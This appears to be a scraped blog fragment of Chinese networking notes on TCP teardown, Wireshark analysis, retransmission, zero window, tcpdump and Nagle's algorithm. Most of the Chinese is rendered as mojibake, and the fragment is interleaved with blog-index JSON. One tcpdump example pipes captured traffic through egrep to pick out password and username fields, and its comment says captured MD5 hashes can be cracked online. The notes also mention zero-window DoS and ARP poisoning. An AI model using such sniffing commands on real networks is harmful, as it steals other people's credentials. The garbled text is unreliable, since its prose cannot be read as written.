teardown(å››æ¬¡æŒ¥æ‰‹å‘Šåˆ«)hostå‘é€ç»™destinationä¸€ä¸ªfin acknowledge packetdestinationå‘æŒ¥ä¸€ä¸ªack packetå’Œä¸€ä¸ªfin ack packethostå†å‘é€ä¸€ä¸ªack(è¿™äº›éƒ½å¯ä»¥ä»flagsé‡Œé¢çœ‹åˆ°) æ³¨æ„ï¼Œå¯ä»¥æ˜¯è¿æ¥çš„ä»»æ„ä¸€æ–¹ä¸»åŠ¨ closeï¼Œè¿™é‡Œå‡è®¾ Client ä¸»åŠ¨å…³é—­è¿æ¥ï¼š 1. Client å‘é€ FIN åŒ…ï¼Œå‘Šè¯‰ Serverï¼šæˆ‘å·²ç»æ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼›Client è¿›å…¥FIN-WAIT-1çŠ¶æ€ï¼› 2. Server æ”¶åˆ° FIN åŒ…åï¼Œå›å¤ ACK åŒ…ï¼Œå‘Šè¯‰ Clientï¼šå¥½çš„ï¼Œä¸è¿‡ä½ éœ€è¦å†ç­‰ä¼šï¼Œæˆ‘å¯èƒ½è¿˜æœ‰æ•°æ®è¦å‘é€ï¼›Server è¿›å…¥CLOSE-WAITçŠ¶æ€ï¼›è€Œ Client æ”¶åˆ° ACK åŒ…åï¼Œç»§ç»­ç­‰å¾… Server åšå¥½å‡†å¤‡ï¼Œ Client è¿›å…¥FIN-WAIT-2çŠ¶æ€ï¼› 3. Server å‡†å¤‡å®Œæ¯•åï¼Œå‘é€ FIN åŒ…ï¼Œå‘Šè¯‰ Clientï¼šæˆ‘ä¹Ÿæ²¡æœ‰ä»€ä¹ˆè¦å‘é€äº†ï¼Œå‡†å¤‡å…³é—­è¿æ¥å§ï¼›Server è¿›å…¥LAST-ACKçŠ¶æ€ï¼› 4. Client æ”¶åˆ° FIN åŒ…åï¼ŒçŸ¥é“ Server å‡†å¤‡å®Œæ¯•äº†ï¼Œäºæ˜¯ç»™å®ƒå›å¤ ACK åŒ…ï¼Œå‘Šè¯‰å®ƒæˆ‘çŸ¥é“äº†ï¼Œäºæ˜¯è¿›å…¥TIME-WAITçŠ¶æ€ï¼›è€Œ Server æ”¶åˆ° ACK åŒ…åï¼Œå³è¿›å…¥CLOSEDçŠ¶æ€ï¼›Client ç­‰å¾… 2MSL æ—¶é—´åï¼Œæ²¡æœ‰å†æ¬¡æ”¶åˆ° Server çš„ FIN åŒ…ï¼Œäºæ˜¯ç¡®è®¤ Server æ”¶åˆ°äº† ACK åŒ…å¹¶ä¸”å·²å…³é—­ï¼Œäºæ˜¯ Client ä¹Ÿè¿›å…¥CLOSEDçŠ¶æ€ï¼› MSLå³æŠ¥æ–‡æœ€å¤§ç”Ÿå­˜æ—¶é—´ï¼ŒRFC793 ä¸­è§„å®š MSL ä¸º 2 åˆ†é’Ÿï¼Œä½†è¿™å®Œå…¨æ˜¯ä»å·¥ç¨‹ä¸Šæ¥è€ƒè™‘ï¼Œå¯¹äºç°åœ¨çš„ç½‘ç»œï¼ŒMSL=2åˆ†é’Ÿå¯èƒ½å¤ªé•¿äº†ä¸€äº›ã€‚å®é™…åº”ç”¨ä¸­å¸¸ç”¨çš„æ˜¯ 30 ç§’ã€1 åˆ†é’Ÿã€2 åˆ†é’Ÿç­‰ï¼›å¯ä»¥ä¿®æ”¹/etc/sysctl.confå†…æ ¸å‚æ•°ï¼Œæ¥ç¼©çŸ­TIME_WAITçš„æ—¶é—´ï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæµªè´¹ã€‚ æ‰€ä»¥æ•´ä¸ªtcpä¼ è¾“çš„è¿‡ç¨‹çœ‹èµ·æ¥åƒè¿™æ · æœ‰æ—¶å€™ä¼šçœ‹åˆ°restï¼Œæ„å‘³ç€è¿æ¥çªç„¶ä¸­æ–­äº†ï¼ˆtcpä¼šæ–­æ‰è¿™ä¸ªsequenceçš„æ‰€æœ‰packetï¼ŒæŠŠflagsé‡Œé¢çš„resetè®¾ç½®ä¸º1ï¼‰ DHCP (Dynamic Host Configuration Protocol)è¿™ä¸ªä½äºç¬¬7å±‚DNSåŒ…ç»“æ„DNSèµ°çš„æ˜¯udpçš„53ç«¯å£ï¼Œå‘å‡ºå»çš„è¯·æ±‚çš„dst.port=53ï¼Œæ”¶åˆ°çš„responseçš„src.port = 53.åœ¨å±€åŸŸç½‘å†…,dstå°±æ˜¯è·¯ç”±ip(192.168.1.1) è®¿é—®tmallä¸»é¡µä¸€æ¥ä¸€å›çš„ å…ˆçœ‹requeståœ¨Domain Name System queryçš„Flagsä¸‹æœ‰ä¸€ä¸ªopcode(è¿™ä¸ªå€¼å¯èƒ½æ˜¯standard queryï¼Œä¹Ÿå¯èƒ½æ˜¯authoritated answers,å¦‚æœresponseæ˜¯ä»name serverå›æ¥çš„è¯)Flagsä¸‹é¢è¿˜æœ‰ä¸€ä¸ªTruncated(æ„æ€å°±æ˜¯ä½ å‘å‡ºçš„è¿™ä¸ªåŒ…æ˜¯ä¸æ˜¯å¤ªå¤§äº†ï¼Œå¤ªå¤§äº†å¡ä¸è¿›ä¸€ä¸ªpacket)è¿˜æœ‰Recursion desire:Do query recursively(è¿™æ„å‘³ç€servernameæ”¯æŒrecursive queryï¼Œå°±æ˜¯å½“å‰dns serveræ‰¾ä¸åˆ°çš„è¯ï¼Œä¼šå¾€ä¸Šç»§ç»­æŸ¥æ‰¾) å†æ¥çœ‹responseç»“æœåœ¨Answersé‡Œé¢ httpsç»“æ„wiresharkä¸Šæ˜¾ç¤ºæˆtlsv1.2æ‰¾application dataï¼Œåœ¨secure socket layeré‡Œé¢æœ‰encrypted Application Data(åŠ å¯†è¿‡çš„)å¦‚æœæ˜¯httpçš„è¯ï¼Œåœ¨hypertext transfer protocolé‡Œé¢æœ€åº•ä¸‹ä¼šæ˜¾ç¤ºhtml encodedçš„postçš„data tcp retransmissionç½‘é€Ÿæ…¢çš„æ—¶å€™(latencyé«˜)tcpä¼šå‘ç°è¿™äº›é—®é¢˜ï¼Œé‡å‘å¦‚æœä¸€ä¸ªpacketå§‹ç»ˆæ²¡æœ‰æ”¶åˆ°ack(åœ¨é™å®šçš„æ—¶é—´å†…)ï¼Œé‡å‘ä¸¤ä¸ªpacketä¹‹é—´çš„æ—¶é—´å«åšround-trip time,æ¯å½“å‡ºç°retransmissionçš„æ—¶å€™ï¼Œzè¿™ä¸ªpacketçš„rtoç›´æ¥doubleï¼ˆwindowsä¸Šé»˜è®¤å°è¯•5æ¬¡ï¼Œlinuxä¸Šæœ‰çš„è¾¾åˆ°15æ¬¡ï¼‰ï¼Œä¸€ç›´è¿™æ ·doubleçš„æ“ä½œè¶…è¿‡5æ¬¡åï¼Œç›´æ¥ä¸¢åŒ… å¦‚æœæ‰¾åˆ°ä¸€ä¸ªretransmissionçš„åŒ…rto timeåœ¨transmission control protocolä¸‹é¢çš„expert infoï¼Œé‡Œé¢æœ‰ä¸ª(the rto for this segment was: 0.220 seconds)å¦‚æœè¿™æ¬¡é‡å‘è¿˜ä¸æˆåŠŸ,0.44så,0.88ç§’åã€‚ç›´åˆ°è¶…è¿‡5æ¬¡å°è¯• tcp duplicatesduplicate ackï¼Œè¿™é€šå¸¸å‡ºç°åœ¨receiveræ”¶åˆ°äº†out of order packetã€‚æ‰€æœ‰çš„tcpè¿æ¥éƒ½æœ‰ä¸€ä¸ªisn( initial sequence number)ï¼Œå°±æ˜¯åˆå§‹åºåˆ—å·äº†ã€‚åç»­çš„packetä¼šåœ¨è¿™ä¸ªæ•°å­—çš„åŸºç¡€ä¸Š,data payloadä¼ é€’äº†å¤šå°‘ï¼Œè¿™ä¸ªæ•°å°±åŠ å¤šå°‘ã€‚æ¯”æ–¹è¯´srcè¿™è¾¹çš„isnæ˜¯1000ï¼Œå‘é€äº†200bytesçš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘æ”¶åˆ°çš„ackåº”è¯¥æ˜¯1200. ä¸Šè¿°æ˜¯ä¸€åˆ‡æ­£å¸¸çš„æƒ…å†µï¼Œä½†æ˜¯å‡å¦‚srcè¿™è¾¹çš„isnæ˜¯1000ï¼Œå‘å‡ºå»200bytesï¼Œdsté‚£è¾¹è¿”å›1200çš„sequence numberçš„ackã€‚æ­¤æ—¶ï¼Œsrcè¿™è¾¹å‡ºäº†é—®é¢˜ï¼Œå‘å‡ºå»ä¸€ä¸ª1400çš„packetï¼Œdsté‚£è¾¹å°±ä¼šè®¤ä¸ºï¼Œä½ è¿™ä¸å¯¹ï¼Œé‡æ¥ä¸€éï¼ˆå‘å›ä¸€ä¸ª1200çš„ackï¼Œä¸€ç›´å°è¯•3æ¬¡ï¼Œç›´åˆ°srcç»ˆäºååº”è¿‡æ¥å‘å‡º1200çš„åŒ…ï¼Œè¿™ä¸ªæ­£ç¡®çš„åŒ…å«åšfast retransmissionï¼‰ã€‚åœ¨wiresharké‡Œé¢ï¼Œdstå‘å›æ¥çš„é‡å¤çš„ackä¼šæ˜¾ç¤ºä¸ºtcp dup ackã€‚srcæœ€åä¸€æ¬¡æ­£ç¡®çš„packetæ˜¾ç¤ºä¸ºtcp fast retransmission æ‰€ä»¥ä¸€æ—¦å‡ºç°äº†skip isnçš„æƒ…å†µï¼Œè¦ä¹ˆdstå‘å›dup ackï¼Œè¦ä¹ˆsrcå‘å‡ºfast retransmission tcp flow controlå³sliding window mechanismï¼ŒåŸç†æ˜¯è°ƒæ•´retransmissionçš„é€Ÿåº¦ï¼ˆæ ¹æ®dstçš„recive windowï¼‰ï¼Œå› ä¸ºdsté‚£è¾¹æ˜¯æœ‰ä¸€ä¸ªtcp buffer spaceçš„ï¼Œä¸‡ä¸€è¿™ä¸ªbufferæº¢å‡ºï¼Œå°±ä¼šé€ æˆä¸¢åŒ…wiresharkä¸­ï¼Œåœ¨transmission control protocolä¸‹é¢ï¼Œæœ‰ä¸€ä¸ªwindow size.æ¯”æ–¹è¯´ï¼Œsrcå‘é€äº†ä¸€ä¸ªisn =1çš„packetï¼Œwindow size = 8760ã€‚dstè¿”å›ä¸€ä¸ªack number = 2921çš„ack,åŒæ—¶window sizeå˜æˆ5840.è¿™ä¹ˆæ¥æ¥å›å›ï¼Œè¿™ä¸ªwindowè¿Ÿæ—©è¢«æ¶ˆè€—ç©ï¼Œtcp zero windowï¼ˆæ­£å¸¸æƒ…å†µä¸‹dstçš„åº”ç”¨å±‚èƒ½å¤Ÿè¯»èµ°è¿™éƒ¨åˆ†æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæ¥æ”¶æ–¹è¯»å–é€Ÿåº¦è·Ÿä¸ä¸Šçš„è¯ï¼Œä¼šå‘é€ä¸€ä¸ªackåŒ…ï¼Œå‘Šè¯‰srcå‘é€æ…¢ä¸€ç‚¹,srcæ¥æ”¶åˆ°äº†ä¹‹åï¼Œå°±ä¼šä¸€ç›´å‘keep-alive packet(éå¸¸å°çš„åŒ…ï¼Œ66byte).å¦‚æœdsté‚£è¾¹è¿˜æ²¡å¤„ç†å¥½çš„è¯ï¼Œä¼šä¸€ç›´è¿”å›Tcp Zero window çš„ackï¼Œè¿™æ ·å¾€è¿”æ•°æ¬¡ï¼‰ã€‚è¿™ä¸ªä¸“é—¨çš„åè¯å«åšZero Window Probeåœ¨wiresharké‡Œé¢,tcp zero windowçš„ackåŒ…é‡Œé¢ä¼šæ˜¾ç¤ºwindow size value: 0åªè¦æœ‰ç­‰å¾…çš„åœ°æ–¹éƒ½å¯èƒ½å‡ºç°DDoSæ”»å‡»ï¼ŒZero Windowä¹Ÿä¸ä¾‹å¤–ï¼Œä¸€äº›æ”»å‡»è€…ä¼šåœ¨å’ŒHTTPå»ºå¥½é“¾å‘å®ŒGETè¯·æ±‚åï¼Œå°±æŠŠWindowè®¾ç½®ä¸º0ï¼Œç„¶åæœåŠ¡ç«¯å°±åªèƒ½ç­‰å¾…è¿›è¡ŒZWPï¼Œäºæ˜¯æ”»å‡»è€…ä¼šå¹¶å‘å¤§é‡çš„è¿™æ ·çš„è¯·æ±‚ï¼ŒæŠŠæœåŠ¡å™¨ç«¯çš„èµ„æºè€—å°½ã€‚ï¼ˆå…³äºè¿™æ–¹é¢çš„æ”»å‡»ï¼Œå¤§å®¶å¯ä»¥ç§»æ­¥çœ‹ä¸€ä¸‹Wikipediaçš„SockStressè¯æ¡ï¼‰ high latencyè¿™ä¸ªä¸»è¦çš„æ ‡å¿—æ˜¯timeè¿™ä¸€æ è¶…è¿‡1ç§’ï¼Œå»¶è¿Ÿçš„åŸå› å¾ˆå¤šã€‚å¯ä»¥åˆ†ææ˜¯å»ç¨‹æ…¢è¿˜æ˜¯è¿”ç¨‹æ…¢ã€‚ä¹Ÿæœ‰å¯èƒ½æ˜¯æœåŠ¡å™¨å¤„ç†å¾ˆæ…¢ã€‚network baseline(æ­£å¸¸çš„å»¶è¿Ÿæ˜¯å¤šå°‘ï¼Œæ¯”å¦‚å›½å†…åˆ°ç¾å›½ä¸€èˆ¬150msä»¥ä¸Šæ˜¯èµ·ç çš„ï¼Œè¿™æ˜¯ç‰©ç†å†³å®šçš„) tcpdumpå®‰è£… sudo apt-get install tcpdump ä½¿ç”¨sudo tcpdump -i wlan0 ##içš„æ„æ€æ˜¯æŒ‡å®šæŸä¸ªç½‘ç»œæ¥å£ï¼Œè¾“å‡ºéå¸¸å¤šsudo tcpdump -D ##å“ªäº›æ¥å£å¯ç”¨sudo tcpdump -i 2 ##åªçœ‹-Dæ˜¾ç¤ºçš„ç¬¬äºŒä¸ªè®¾å¤‡sudo tcpdump -v -A ## Açš„æ„æ€æ˜¯ASCIIï¼Œè‡³å°‘å†…å®¹å®¹æ˜“è¾¨è¯†sudo tcpdump -i 2 -c 4 ##åªæŠ“4ä¸ªåŒ…sudo tcpdump -i 2 -c -4 -n arp ##åªæŠ“arpçš„åŒ…,nçš„æ„æ€æ˜¯supress host name,ä¹Ÿèƒ½ç”¨æ¥æŒ‡å®šåè®®sudo tcpdump -i 2 -c -4 -n tcp ##åªæŠ“4ä¸ªtcpsudo tcpdump -i 2 -c -4 -n icmp ##åªæŠ“4ä¸ªicmpsudo tcpdump -i 2 -c -4 src 192.168.1.1 ##æŒ‡å®šsrc sudo tcpdump -i 2 -c -4 -w filename.pcap ##ä¿å­˜åˆ°æ–‡ä»¶,è¿™ä¸ªæ–‡ä»¶ç”¨tcpdumpæ‰“å¼€ä¹Ÿæ˜¯å¯ä»¥çš„sudo tcpdump -r filename.pcap ##è¯»å–è¿™ä¸ªæ–‡ä»¶ å¯ä»¥å’Œegrepä¸€èµ·ç”¨sudo tcpdump -A -i 2 | egrep -i â€˜pass=|pwd=|password=|username=â€™ â€“color=auto â€“line-buffered//æ¯”æ–¹è¯´æŠ“åˆ°äº†md5è¿‡çš„å¯†ç ï¼Œéšä¾¿æ‰¾ä¸ªè§£å¯†ç½‘ç«™ï¼Œå°±èƒ½è§£å‡ºæ¥äº† tbdæŠ“åŒ…ï¼Œjsonå’ŒprotoBufçš„payloadåŒºåˆ«ï¼Œä¸ºä»€ä¹ˆåŒæ ·çš„æ•°æ®ï¼Œåè€…æ›´çœæµé‡ï¼Ÿ ARPæ¬ºéª— arp cache poisoning attackå¸¸ç”¨çš„ç«¯å£å·å„ç§å¯èƒ½çš„pcapæ–‡ä»¶æœ¬æ–‡å¤§é‡æ–‡å­—å›¾ç‰‡å‡ºå¤„","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"tcp-nagel-algorithm-and-delay-ack","date":"2018-11-06T13:25:55.000Z","path":"2018/11/06/2018-11-06-nagel-algorithm-and-delay-ack/","text":"Nagleâ€™s Algorithm å’Œ Delayed ACK ä¸€èµ·ç”¨åœ¨ç‰¹å®šåœºæ™¯ä¸‹å¯èƒ½ä¼šé€ æˆç½‘é€Ÿä¸å¿…è¦çš„å»¶è¿Ÿå‚³é€ TCP å°åŒ…çš„æ™‚å€™ï¼Œ TCP header å  20 bytesï¼Œ IPv4 header å  20 bytesï¼Œè‹¥å‚³é€çš„è³‡æ–™å¤ªå°ï¼Œ TCP/IPv4 headers é€ æˆçš„ overhead (40bytes) ä¸¦ä¸åˆ’ç®—ã€‚æƒ³åƒå‚³é€è³‡æ–™åªæœ‰ 1 byteï¼Œå»è¦å¦å¤–å‚³ 40 bytes headerï¼Œé€™æ˜¯å¾ˆå¤§çš„æµªè²»ã€‚è‹¥ç¶²è·¯ä¸Šæœ‰å¤§é‡å°å°åŒ…ï¼Œæœƒå å»ç¶²è·¯é »å¯¬ï¼Œå¯èƒ½æœƒé€ æˆç¶²è·¯æ“å¡ ã€‚è¿™ä¸ªæ˜¯é’ˆå¯¹å‘é€æ–¹è€Œè¨€çš„ã€‚ ä¸€ä¸ªTCPæ•°æ®åŒ…çš„ä¼ è¾“è‡³å°‘éœ€è¦å›ºå®šçš„40å­—èŠ‚å¤´éƒ¨ä¿¡æ¯(20å­—èŠ‚TCP + 20å­—èŠ‚IP)ï¼Œå¦‚æœæ•°æ®åŒ…å®é™…è´Ÿè½½éƒ½æ¯”è¾ƒå°çš„è¯ï¼Œé‚£ä¹ˆä¼ è¾“çš„æ•ˆç‡å°±éå¸¸ä½ï¼Œä½†æ˜¯å¦‚æœå°†è¿™äº›å°åŒ…çš„è´Ÿè½½éƒ½å°½é‡é›†ä¸­èµ·æ¥ï¼Œå°è£…åˆ°ä¸€ä¸ªTCPæ•°æ®åŒ…ä¸­è¿›è¡Œä¼ è¾“ï¼Œé‚£ä¹ˆä¼ è¾“æ•ˆç‡åŠ¿å¿…å°†ä¼šå¤§å¤§æé«˜ã€‚æ­¤å¤„æˆ‘ä»¬å†æ¬¡å¼ºè°ƒï¼ŒTCPä¼ è¾“çš„æ˜¯ä¸€ä¸ªå­—èŠ‚æµï¼Œæœ¬èº«ä¸å­˜åœ¨æ‰€è°“çš„ç¦»æ•£å½¢å¼çš„æ•°æ®åŒ…çš„æ¦‚å¿µï¼Œåè®®å¯ä»¥ä»»æ„ç»„åˆã€æ‹†åˆ†æ¯æ¬¡è°ƒç”¨å®é™…ä¼ è¾“çš„æ•°æ®é•¿åº¦ã€‚ Nagleç®—æ³•çš„æ€è·¯åœ¨wikiä¸Šä¹Ÿèƒ½æ‰¾åˆ° if there is new data to send if the window size &gt;= MSS and available data is &gt;= MSS send complete MSS segment now else if there is unconfirmed data still in the pipe enqueue data in the buffer until an acknowledge is received else send data immediately end if end if end if å¦‚æœå‘é€å†…å®¹å¤§äº1ä¸ªMSSï¼Œ ç«‹å³å‘é€ï¼›å¦‚æœä¹‹å‰æ²¡æœ‰åŒ…æœªè¢«ç¡®è®¤ï¼Œ ç«‹å³å‘é€ï¼›å¦‚æœä¹‹å‰æœ‰åŒ…æœªè¢«ç¡®è®¤ï¼Œ ç¼“å­˜å‘é€å†…å®¹ï¼›å¦‚æœæ”¶åˆ°ackï¼Œ ç«‹å³å‘é€ç¼“å­˜çš„å†…å®¹ã€‚ æ¦‚æ‹¬åœ°è¯´æ¥ï¼Œå…¶æµç¨‹è¡¨è¿°ä¸ºï¼š(a)ä¸è€ƒè™‘çª—å£æµé‡æ§åˆ¶çš„é™åˆ¶ï¼Œä¸€æ—¦ç´¯ç§¯çš„æ•°æ®è¾¾åˆ°MSSå°±ç«‹å³æ‰§è¡Œä¼ è¾“ï¼›(b)å¦åˆ™å¦‚æœå½“å‰æœ‰æœªACKçš„æ•°æ®ï¼Œå°±å°†æ•°æ®å †ç§¯åˆ°å‘é€é˜Ÿåˆ—é‡Œå»¶è¿Ÿå‘é€ï¼›(c)å¦‚æœæ²¡æœ‰å¾…éœ€è¦ACKçš„æ•°æ®ï¼Œå°±ç«‹å³å‘é€ã€‚ç®€å•è¯´æ¥ï¼Œå°±æ˜¯åœ¨æ•°æ®æ²¡æœ‰ç´¯ç§¯åˆ°MSSçš„å¤§å°æƒ…å†µä¸‹ï¼Œæ•´ä¸ªè¿æ¥ä¸­å…è®¸æœ‰æœªACKçš„æ•°æ®ã€‚ Nagelç®—æ³•æœ¬è´¨ä¸Šå°±æ˜¯ä¸ªæ—¶é—´æ¢å¸¦å®½çš„æ–¹æ³•ï¼Œæ‰€ä»¥å¯¹äºé‚£äº›å¸¦å®½è¦æ±‚ä¸å¤§ä½†å¯¹å®æ—¶æ€§è¦æ±‚é«˜çš„ç¨‹åºï¼Œæ¯”å¦‚ç±»ä¼¼ç½‘ç»œæ¸¸æˆç±»ï¼Œéœ€è¦ä½¿ç”¨TCP_NODELAYè¿™ä¸ªsocketé€‰é¡¹æ¥å…³é—­è¿™ä¸ªç‰¹æ€§ä»¥å‡å°å»¶æ—¶å‘ç”Ÿã€‚ä¸è¿‡è¯å¤–è¯´æ¥ï¼Œå¯¹äºè¿™ç±»ç¨‹åºæˆ–è®¸ä½¿ç”¨UDPåè®®ä¹Ÿæ˜¯ä¸ªé€‰æ‹©ã€‚ æƒ³è±¡ä¸€ä¸‹ï¼ŒåŒæ—¶ä¸¢å‡ºå»ä¸€å¤§å †åªæœ‰50ä¸ªå­—èŠ‚çš„åŒ…è¿˜æ˜¯ä¼šé€ æˆå¸¦å®½çš„æµªè´¹ï¼Œè¿˜ä¸å¦‚æ”’åœ¨ä¸€èµ·å‘å‡ºå»ã€‚ åœ¨Nagleç®—æ³•ä¸­å‚æ•°MSS(maximum segment sizeï¼ŒIPv4é»˜è®¤å€¼æ˜¯576-20-20 = 536)Maximum_segment_sizeåœ¨wikiä¸Šè¿˜æœ‰ä¸“é—¨çš„ä»‹ç» ä¸€äº›å…³é”®è¯ï¼š acknowledged: TCP å‚³é€å°åŒ…æ™‚æœƒå¸¶æœ‰æµæ°´è™Ÿ ï¼Œèµ·å§‹å€¼éš¨æ©Ÿï¼Œå¾Œé¢æ¯å‚³ 1 byte å°± +1ã€‚å°æ–¹æ”¶åˆ°å¾Œæœƒå›å‚³ ACK å°åŒ…ï¼Œå¸¶æœ‰æœ€å¾Œæ”¶åˆ° byte çš„æ•¸å­—ã€‚æ¯”æ–¹èªªæ”¶åˆ° 100 bytesï¼Œå†æ”¶åˆ° 200 bytesï¼Œåªè¦ ACKã€Œèµ·å§‹å€¼+300ã€å³å¯ã€‚ sliding window: å…è¨±å‚³é€ unacked bytes çš„æœ€å¤§å€¼ï¼Œç¢ºä¿åœ¨ç¶²è·¯ä¸ä½³çš„æƒ…æ³ä¸‹ï¼Œå‚³é€ç«¯ä¸æœƒå‚³é€éå¤šå°åŒ…åŠ é‡æ“å¡ã€‚sliding window çš„æœ€å¤§å€¼æ˜¯ 2Â¹â¶ = 64 (KB) Delay ACKACK ä¹Ÿæ˜¯å°å°åŒ…ï¼Œç‚ºäº†é¿å…ç”¢ç”Ÿå¤ªå¤šå°å°åŒ…ï¼Œæ‰€ä»¥æ¥æ”¶ç«¯ä¸æœƒæ¯æ¬¡æ”¶åˆ°å°åŒ…éƒ½ç«‹å³ç™¼ ACKï¼Œå¦‚æœä¹‹å¾Œå‰›å¥½éœ€è¦é€è³‡æ–™ ï¼Œé †ä¾¿å¸¶ä¸Š ACKå»å¯ä»¥çœå»å°å°åŒ…ã€‚å¯¦ä¾‹: telnet server æœƒå›å‚³ä½¿ç”¨è€…å‰›æ‰“çš„å­—ï¼Œé †ä¾¿é€ ACK å°±å¯ä»¥çœå»å°å°åŒ…ã€‚ Linuxçš„å®ç°åœ¨ __tcp_ack_snd_checkè¿™ä¸ªæ–¹æ³• é€šå¸¸æœ€å¤šå»¶é² 200msï¼ŒRFC è¦å®šä¸èƒ½è¶…é 500msã€‚æ¯æ”¶åˆ°å…©å€‹ full-sized packetï¼Œä¸€å®šè¦å›ä¸€æ¬¡ ACKã€‚ å…©è€…åˆç”¨çš„å•é¡Œå‡è¨­å‚³é€ç«¯æœ‰é–‹ Nagleâ€™s Algorithmï¼Œæ¥æ”¶ç«¯æœ‰é–‹ delayed ACK (å…©è€…åœ¨ Linux éƒ½æ˜¯é è¨­å€¼)ã€‚ ä»¥ HTTP ç‚ºä¾‹ï¼Œè‹¥ server çš„ response è¢«åˆ‡æˆå…©æ¬¡ sendï¼Œä¸€æ¬¡é€ headerï¼Œä¸€æ¬¡é€ bodyï¼Œå…©è€…éƒ½ &lt;MSSã€‚ server é€å®Œ header å¾Œï¼Œå› ç‚º client æ²’æœ‰å› ACK (delayed ACK)ï¼Œserver ä¹Ÿä¸æœƒé€ body (æ‡‰ç”¨å±¤è¦ºå¾—å®ƒå·²ç¶“é€å‡ºäº†ï¼Œä½† kernel é‚„æ²’é€)ã€‚client éäº† 200msï¼Œé€å‡ºæ”¶åˆ° header çš„ ACKã€‚server æ”¶åˆ° ACK å¾Œï¼Œé€å‡º bodyã€‚æ–¼æ˜¯ client å¤šç­‰äº† 200ms æ‰æ”¶åˆ°å®Œæ•´çš„ responseã€‚ tcpç¼“å†²çš„æ¦‚å¿µtcpç¼“å†²è¿™äº›ä¸œè¥¿å¯¹äºåº”ç”¨å±‚æ¥è¯´æ˜¯æ— æ„Ÿçš„ socketæ”¯æŒblocking(é»˜è®¤)å’Œnon-blockingæ¨¡å¼ï¼Œè¯»å†™éƒ½å­˜åœ¨é˜»å¡é—®é¢˜ #include &lt;unistd.h&gt; ssize_t write(int fd, const void *buf, size_t count); ç‰µæ¶‰åˆ°tcpç¼“å†²å±‚å¤§å° é¦–å…ˆï¼ŒwriteæˆåŠŸè¿”å›ï¼Œåªæ˜¯bufä¸­çš„æ•°æ®è¢«å¤åˆ¶åˆ°äº†kernelä¸­çš„TCPå‘é€ç¼“å†²åŒºã€‚è‡³äºæ•°æ®ä»€ä¹ˆæ—¶å€™è¢«å‘å¾€ç½‘ç»œï¼Œä»€ä¹ˆæ—¶å€™è¢«å¯¹æ–¹ä¸»æœºæ¥æ”¶ï¼Œä»€ä¹ˆæ—¶å€™è¢«å¯¹æ–¹è¿›ç¨‹è¯»å–ï¼Œç³»ç»Ÿè°ƒç”¨å±‚é¢ä¸ä¼šç»™äºˆä»»ä½•ä¿è¯å’Œé€šçŸ¥ã€‚å·²ç»å‘é€åˆ°ç½‘ç»œçš„æ•°æ®ä¾ç„¶éœ€è¦æš‚å­˜åœ¨send bufferä¸­ï¼Œåªæœ‰æ”¶åˆ°å¯¹æ–¹çš„ackåï¼Œkernelæ‰ä»bufferä¸­æ¸…é™¤è¿™ä¸€éƒ¨åˆ†æ•°æ®ï¼Œä¸ºåç»­å‘é€æ•°æ®è…¾å‡ºç©ºé—´ã€‚æ¥æ”¶ç«¯å°†æ”¶åˆ°çš„æ•°æ®æš‚å­˜åœ¨receive bufferä¸­ï¼Œè‡ªåŠ¨è¿›è¡Œç¡®è®¤ã€‚ä½†å¦‚æœsocketæ‰€åœ¨çš„è¿›ç¨‹ä¸åŠæ—¶å°†æ•°æ®ä»receive bufferä¸­å–å‡ºï¼Œæœ€ç»ˆå¯¼è‡´receive bufferå¡«æ»¡ï¼Œç”±äºTCPçš„æ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶ï¼Œæ¥æ”¶ç«¯ä¼šé˜»æ­¢å‘é€ç«¯å‘å…¶å‘é€æ•°æ®ã€‚è¿™äº›æ§åˆ¶çš†å‘ç”Ÿåœ¨TCP/IPæ ˆä¸­ï¼Œå¯¹åº”ç”¨ç¨‹åºæ˜¯é€æ˜çš„ï¼Œåº”ç”¨ç¨‹åºç»§ç»­å‘é€æ•°æ®ï¼Œæœ€ç»ˆå¯¼è‡´send bufferå¡«æ»¡ï¼Œwriteè°ƒç”¨é˜»å¡ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œç”±äºæ¥æ”¶ç«¯è¿›ç¨‹ä»socketè¯»æ•°æ®çš„é€Ÿåº¦è·Ÿä¸ä¸Šå‘é€ç«¯è¿›ç¨‹å‘socketå†™æ•°æ®çš„é€Ÿåº¦ï¼Œæœ€ç»ˆå¯¼è‡´å‘é€ç«¯writeè°ƒç”¨é˜»å¡ã€‚ è€Œreadè°ƒç”¨çš„è¡Œä¸ºç›¸å¯¹å®¹æ˜“ç†è§£ï¼Œä»socketçš„receive bufferä¸­æ‹·è´æ•°æ®åˆ°åº”ç”¨ç¨‹åºçš„bufferä¸­ã€‚readè°ƒç”¨é˜»å¡ï¼Œé€šå¸¸æ˜¯å‘é€ç«¯çš„æ•°æ®æ²¡æœ‰åˆ°è¾¾ã€‚ readæ€»æ˜¯åœ¨æ¥æ”¶ç¼“å†²åŒºæœ‰æ•°æ®æ—¶ç«‹å³è¿”å›ï¼Œè€Œä¸æ˜¯ç­‰åˆ°ç»™å®šçš„read bufferå¡«æ»¡æ—¶è¿”å›ã€‚åªæœ‰å½“receive bufferä¸ºç©ºæ—¶ï¼Œblockingæ¨¡å¼æ‰ä¼šç­‰å¾…ï¼Œè€Œnonblockæ¨¡å¼ä¸‹ä¼šç«‹å³è¿”å›-1ï¼ˆerrno = EAGAINæˆ–EWOULDBLOCKï¼‰ blockingçš„writeåªæœ‰åœ¨ç¼“å†²åŒºè¶³ä»¥æ”¾ä¸‹æ•´ä¸ªbufferæ—¶æ‰è¿”å›ï¼ˆä¸blocking readå¹¶ä¸ç›¸åŒï¼‰ nonblock writeåˆ™æ˜¯è¿”å›èƒ½å¤Ÿæ”¾ä¸‹çš„å­—èŠ‚æ•°ï¼Œä¹‹åè°ƒç”¨åˆ™è¿”å›-1ï¼ˆerrno = EAGAINæˆ–EWOULDBLOCKï¼‰ 